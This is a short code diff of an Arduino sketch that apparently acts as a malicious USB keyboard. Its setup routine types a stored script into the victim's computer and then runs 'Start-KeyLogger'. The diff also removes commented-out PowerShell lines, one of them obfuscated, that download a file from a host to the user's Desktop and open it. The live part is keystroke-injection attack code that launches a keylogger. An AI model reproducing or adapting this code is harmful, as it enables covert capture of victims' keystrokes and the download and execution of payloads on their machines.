@@ -49,10 +49,6 @@ void setup() {
   delay(500);
   Keyboard.print(SCRIPT);
   Keyboard.println("Start-KeyLogger");
-  /*Keyboard.println("*New/Object System.Net.WebClient(.DownloadFile*@http>&&localhost&CodePNG.png@, @$*$Env>userprofile(&Desktop&CodePNG.png@(");
-    Keyboard.println("Invoke/item $Env>userprofile&Desktop&CodePNG.png");*/
-  /*Keyboard.println("(New-Object System.Net.WebClient).DownloadFile(\"http://localhost/CodePNG.png\", \"$($Env:userprofile)/Desktop/CodePNG.png\")");
-    Keyboard.println("Invoke-item $Env:userprofile/Desktop/CodePNG.png"); */
   Keyboard.releaseAll();
 
   Keyboard.end();
